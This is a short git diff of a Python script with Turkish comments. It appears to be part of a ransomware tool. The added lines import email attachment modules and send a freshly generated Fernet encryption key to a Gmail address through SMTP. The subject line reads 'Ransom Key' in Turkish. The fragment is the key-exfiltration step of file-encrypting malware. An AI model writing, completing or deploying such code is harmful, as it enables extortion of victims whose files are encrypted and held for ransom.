@@ -2,6 +2,8 @@ import os
 import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
 from cryptography.fernet import Fernet
 
 def send_email(subject, body, to_address, username, password, attachment_data=None):
@@ -39,4 +41,7 @@ key = Fernet.generate_key()
 
 # Gmail hesabınızın kullanıcı adı ve şifresi
 gmail_username = 'your_email@gmail.com'
-gmail_password = 'your_email_pass
+gmail_password = 'your_email_password'
+
+# Anahtarı e-posta ile gönder
+send_email(subject='Fidye Anahtarı', body='Fidye anahtarı bulunmaktadır.', to_address='your_email@gmail.com', username=gmail_username, password=gmail_password, attachment_data=key)
